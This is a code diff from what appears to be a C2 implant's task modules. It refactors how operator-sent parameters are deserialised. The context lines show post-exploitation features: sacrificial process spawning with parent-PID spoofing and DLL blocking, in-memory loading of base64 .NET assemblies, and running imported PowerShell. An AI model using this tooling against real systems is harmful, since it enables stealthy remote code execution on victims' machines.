@@ -86,7 +86,7 @@ namespace Agent.Modules
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<AgentTask>(C2Data.Data).Parameters;
                 var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
 
                 var lamb = new SacrificialLamb(ppid, blockdlls);
@@ -107,7 +107,7 @@ namespace Agent.Modules
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var command = (string)parameters.FirstOrDefault(p => p.Name.Equals("Command", StringComparison.OrdinalIgnoreCase)).Value;
                 var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
@@ -135,7 +135,7 @@ namespace Agent.Modules
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
 
                 var lamb = new SacrificialLamb(ppid, blockdlls);
@@ -153,7 +153,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
 
                 using (var runner = new PowerShellRunner())
@@ -180,7 +180,7 @@ namespace Agent.Modules
 
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
                 var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
@@ -228,7 +228,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
 
                 CurrentAssembly = Assembly.Load(asmBytes);
@@ -244,7 +244,7 @@ namespace Agent.Modules
 
         void ImportPowerShell(string AgentID, C2Data C2Data)
         {
-            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
             CurrentPowerShell = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Script", StringComparison.OrdinalIgnoreCase)).Value);
 
             Agent.SendMessage($"Imported {CurrentPowerShell.Length} bytes.");
@@ -254,7 +254,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var type = (string)parameters.FirstOrDefault(p => p.Name.Equals("Type", StringComparison.OrdinalIgnoreCase)).Value;
                 var method = (string)parameters.FirstOrDefault(p => p.Name.Equals("Method", StringComparison.OrdinalIgnoreCase)).Value;
